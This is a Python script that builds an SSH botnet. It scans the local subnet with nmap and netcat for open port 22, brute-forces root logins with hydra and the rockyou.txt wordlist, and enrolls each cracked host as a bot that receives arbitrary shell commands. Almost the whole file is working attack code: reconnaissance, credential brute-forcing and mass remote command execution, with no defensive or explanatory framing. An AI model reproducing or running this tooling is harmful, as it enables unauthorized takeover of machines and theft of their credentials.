from pexpect import pxssh
import subprocess
import numpy as np
import re
import get_lan_ip
import getpass

class Bot:

    def __init__(self, host, user, password):
        self.user = user
        self.password = password
        self.host = host
        self.session = self.ssh()

    def ssh(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print('Connection failure.')
            print(e)
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def command_bots(command):
    for bot in botnet:
        s=bot.ssh()
        bot.session = s
        attack = bot.send_command(command)
        print('Output from ' + bot.host)
        print(attack)

#get target machine
def targets():
    neighbors = get_neighbor()
    known_host = [b.host for b in botnet]
    return list(set(neighbors)-set(known_host))

#ssh open
#netcat -zv host port(22)
neighbors=[]
def get_neighbor():
    #get all servers that have port 22 open
    output = subprocess.Popen(['ip','route'],stdout=subprocess.PIPE)
    response = output.communicate()[0]
    res = response.decode("utf-8")
    gateway = re.findall( '[0-9]+(?:\.[0-9]+){3}',res)[0]
    gat_mask = '.'.join(gateway.split('.')[0:-1])+".*"
    output_2 = subprocess.Popen(['nmap','-sn',gat_mask],stdout=subprocess.PIPE)
    response_2 = output_2.communicate()[0]
    res_2 = response_2.decode("utf-8")
    ips = re.findall('[0-9]+(?:\.[0-9]+){3}',res_2)
    #check for open ssh port
    for ip in ips:
        out_3 = subprocess.Popen(['netcat','-zv',ip,'22'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
        response_3 = out_3.stdout.read()
        resp = response_3.decode("utf-8")
        if "open" not in resp:
            continue
        neighbors.append(ip)
    neighbors.remove('10.150.0.7')
    print(neighbors)
    
    return neighbors

#sudo apt-get install hydra hydra-gtk
#hydra -l root -P rockyou.txt -t 4 ip
def hydra(hosts):
    for h in hosts:
        output = subprocess.Popen(['hydra', '-l', 'root', '-P', 'rockyou.txt', '-t', '4',h,'ssh'], stdout = subprocess.PIPE)
        response = output.communicate()[0]
        str_res = response.decode("utf-8")
        print(str_res)
        if str_res.split("password: ",1)  is None:
            continue
        rest = str_res.split("password: ", 1)[1]
        password =rest.split("\n",1)[0]
        #ret = re.findall('[0-9]+(?:\.
        print(h + " 's password is :", password)
        # if password is valid, add the new bot to botnet
        if password is not None:
            add_bot(h,"root",password)

botnet = []
def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)
#local_lan_ip = get_lan_ip
#user = subprocess.check_output(['whoami'])
#add_bot('ip','user','password')
#command_bots('ls')
